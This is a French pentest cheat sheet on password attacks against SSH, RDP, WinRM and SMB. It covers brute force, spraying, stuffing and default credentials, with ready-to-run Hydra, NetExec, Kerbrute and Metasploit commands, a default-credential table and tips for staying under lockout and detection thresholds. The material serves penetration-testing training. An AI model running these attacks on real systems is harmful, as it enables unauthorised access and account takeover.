# Attaques distantes

Les services d'administration distante (SSH, RDP, WinRM, SMB) sont des cibles de choix pour les attaques par mot de passe. Qu'il s'agisse de brute force, de password spraying ou de credential stuffing, ces techniques permettent souvent d'obtenir un acces initial sur le reseau cible.

## Pourquoi

Chaque service reseau qui demande une authentification est une porte d'entree potentielle. En pentest, on rencontre systematiquement des services SSH, RDP ou SMB exposes. L'objectif est de trouver un couple identifiant/mot de passe valide pour s'authentifier et obtenir un acces interactif ou des donnees sensibles.

## Comment ca marche

### Brute force vs spraying vs stuffing

| Technique | Principe | Risque de lockout |
|---|---|---|
| **Brute force** | Tester N mots de passe sur un seul compte | Eleve (verrouillage rapide) |
| **Password spraying** | Tester un seul mot de passe sur N comptes | Faible (sous le seuil de lockout) |
| **Credential stuffing** | Tester des paires user:pass issues de fuites | Moyen (depend du volume) |
| **Credentials par defaut** | Tester les identifiants constructeur par defaut | Nul |

{% hint style="warning" %}
En environnement reel, le brute force classique declenche rapidement des alertes et des verrouillages de compte. Le password spraying est la technique preferee en pentest interne car elle reste sous les seuils de detection.
{% endhint %}

## En pratique

### Brute force par service

{% tabs %}
{% tab title="SSH" %}
```bash
# - Brute force SSH avec Hydra
hydra -L users.txt -P passwords.txt ssh://<IP_CIBLE>

# - Connexion avec les credentials trouves
ssh user@<IP_CIBLE>
```
{% endtab %}
{% tab title="RDP" %}
```bash
# - Brute force RDP avec Hydra
hydra -L users.txt -P passwords.txt rdp://<IP_CIBLE>

# - Brute force RDP avec NetExec
netexec rdp <IP_CIBLE> -u users.txt -p passwords.txt

# - Connexion avec xfreerdp
xfreerdp /v:<IP_CIBLE> /u:<user> /p:<password>
```
{% endtab %}
{% tab title="WinRM" %}
```bash
# - Brute force WinRM avec NetExec
netexec winrm <IP_CIBLE> -u users.txt -p passwords.txt

# - Le resultat "(Pwn3d!)" indique une execution de commande possible

# - Connexion avec Evil-WinRM
evil-winrm -i <IP_CIBLE> -u <user> -p <password>
```
{% endtab %}
{% tab title="SMB" %}
```bash
# - Brute force SMB avec NetExec
netexec smb <IP_CIBLE> -u users.txt -p passwords.txt

# - Brute force SMB avec Metasploit
msf6 > use auxiliary/scanner/smb/smb_login
msf6 > set user_file users.txt
msf6 > set pass_file passwords.txt
msf6 > set rhosts <IP_CIBLE>
msf6 > run

# - Enumerer les partages apres authentification
netexec smb <IP_CIBLE> -u <user> -p <password> --shares

# - Se connecter a un partage
smbclient -U <user> \\\\<IP_CIBLE>\\SHARE
```
{% endtab %}
{% endtabs %}

### Password spraying

```bash
# - Spray un mot de passe sur tout un sous-reseau
netexec smb 10.10.10.0/24 -u users.txt -p 'Company2025!'

# - Spray sur Active Directory avec Kerbrute
kerbrute passwordspray -d inlanefreight.local --dc <IP_DC> users.txt 'Company2025!'
```

{% hint style="success" %}
Les mots de passe saisonniers sont tres courants en entreprise : `Company2025!`, `Welcome2025`, `Inlanefreight1!`. Les politiques de mot de passe imposent souvent une majuscule, un chiffre et un caractere special, ce qui donne des patterns previsibles.
{% endhint %}

### Credential stuffing

```bash
# - Tester des paires user:pass issues d'une fuite
# Format du fichier : user:password (une paire par ligne)
hydra -C credentials.txt ssh://<IP_CIBLE>
```

### Credentials par defaut

De nombreux equipements et logiciels sont deployes avec des identifiants par defaut que les administrateurs oublient de modifier.

```bash
# - Installer la cheat sheet des credentials par defaut
pip3 install defaultcreds-cheat-sheet
creds search tomcat

# - Tester avec Hydra
hydra -C defaults.txt http-get://<IP_CIBLE>:8080/manager/html
```

| Produit | Utilisateur | Mot de passe |
|---|---|---|
| Apache Tomcat | tomcat | tomcat |
| phpMyAdmin | root | (vide) |
| Cisco IOS | admin | admin |
| FortiGate | admin | (vide) |
| Jenkins | admin | admin |

## Pieges et galeres

- **Lockout** : verifier la politique de verrouillage avant de lancer un brute force. En AD, le seuil est souvent de 3 a 5 tentatives
- **Rate limiting** : certains services ralentissent ou bloquent les connexions apres trop de tentatives. Ajouter un delai (`-w` dans Hydra) ou du jitter
- **SMBv1 vs v3** : certaines versions de Hydra ne supportent pas SMBv3. Utiliser NetExec ou mettre Hydra a jour
- **False positives** : NetExec peut afficher un succes avec un compte desactive. Toujours valider en tentant une connexion reelle

## Memo express

| Commande | Usage |
|---|---|
| `hydra -L users -P pass ssh://<IP>` | Brute force SSH |
| `netexec smb <IP> -u users -p pass` | Brute force SMB |
| `netexec winrm <IP> -u users -p pass` | Brute force WinRM |
| `hydra -C creds.txt <protocol>://<IP>` | Credential stuffing |
| `kerbrute passwordspray` | Spray AD |
| `evil-winrm -i <IP> -u <user> -p <pass>` | Connexion WinRM |

***
